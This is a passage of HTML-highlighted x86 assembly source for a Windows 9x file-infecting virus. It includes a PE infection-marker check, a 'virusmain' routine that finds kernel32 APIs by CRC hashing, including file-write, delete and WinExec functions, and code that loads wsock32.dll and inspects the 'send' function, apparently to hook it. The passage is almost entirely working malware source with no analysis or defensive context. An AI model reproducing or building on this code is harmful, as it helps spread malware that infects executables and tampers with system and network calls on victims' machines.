       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">14eh</span><span class="sc0">                    </span><span class="sc1">;586</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">;(not('PE')xor(pe_ofs)xor(entry))</span><span class="sc0">
       </span><span class="sc6">bswap</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;infected?</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                           </span><span class="sc1">;mov ax, ?</span><span class="sc0">
  </span><span class="sc5">@@error</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">check_file</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">gdt</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">idt</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">ring0_cs</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">ring0_ds</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">jmpfar</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">wsize</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">26</span><span class="sc0">

</span><span class="sc5">kernel32</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0bff70000h</span><span class="sc0">

</span><span class="sc5">virusmain</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">pushf</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">wsize</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@seh</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;hmm... SEH... :/</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@installed</span><span class="sc0">
  </span><span class="sc5">@@seh</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">kernel32</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">+</span><span class="sc2">120</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;get kernel32 APIs...</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc5">kernel32</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">)</span><span class="sc0">                 </span><span class="sc1">;esi=export directory+24</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                  </span><span class="sc1">;ebp=RVA table</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                  </span><span class="sc1">;ecx=number of names</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;esi=names table</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">;ebx=ordinal table</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">kernel32</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">;edx=-kernel32</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
  </span><span class="sc5">@@loopy</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;edi=ordinal counter</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">;eax=API name string</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CRC_INIT</span><span class="sc0">                           </span><span class="sc1">;calculate crc of string</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc5">@@next_byte</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@done</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
  </span><span class="sc5">@@next_bit</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">@@poly</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CRC_POLY</span><span class="sc0">
  </span><span class="sc5">@@poly</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@next_bit</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@next_byte</span><span class="sc0">
  </span><span class="sc5">@@done</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@delta1</span><span class="sc0">
  </span><span class="sc5">@@delta1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_openfile</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">@@delta1</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">                      </span><span class="sc1">;crcz of API</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc5">crc</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CreateFileA</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@patch_api</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-((</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_getfattr</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_openfile</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">))</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc5">crc</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetFileAttributesA</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@patch_api</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-((</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_writefile</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_getfattr</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">))</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc5">crc</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">WriteFile</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@patch_api</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_closehandle</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_writefile</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">))</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc5">crc</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CloseHandle</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@patch_api</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-((</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_seekfile</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_closehandle</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">))</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc5">crc</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SetFilePointer</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@patch_api</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_loadl</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_seekfile</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc5">crc</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">LoadLibraryA</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@patch_api</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_freel</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_loadl</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc5">crc</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">FreeLibrary</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@patch_api</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-((</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_getproc</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_freel</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">))</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc5">crc</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetProcAddress</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@patch_api</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_gsystime</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_getproc</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc5">crc</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetSystemTime</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@patch_api</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-((</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_fdelete</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_gsystime</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">))</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc5">crc</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">DeleteFileA</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@patch_api</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_readfile</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_fdelete</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc5">crc</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ReadFile</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@patch_api</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_getmhandle</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_readfile</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc5">crc</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetModuleHandleA</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@patch_api</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-((</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_winexec</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_getmhandle</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">))</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc5">crc</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">WinExec</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">@@end_loopy</span><span class="sc0">

  </span><span class="sc5">@@patch_api</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+(</span><span class="sc8">edi</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)]</span><span class="sc0">             </span><span class="sc1">;get ordinal</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">                  </span><span class="sc1">;get rva</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">;got it!</span><span class="sc0">
  </span><span class="sc5">@@end_loopy</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@loopy</span><span class="sc0">                            </span><span class="sc1">;all APIs scanned</span><span class="sc0">

       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">wsock</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
  </span><span class="sc5">_loadl</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;load wsock32.dll</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">@@suxx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;for FreeLibrary</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@send</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'send'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">@@send</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc0">                               </span><span class="sc1">;GetProcAddress</span><span class="sc0">
  </span><span class="sc5">_getproc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">                      </span><span class="sc1">;the difference between masters</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@isnt</span><span class="sc0">                              </span><span class="sc1">;and pupils ;)</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@isnt</span><span class="sc0">
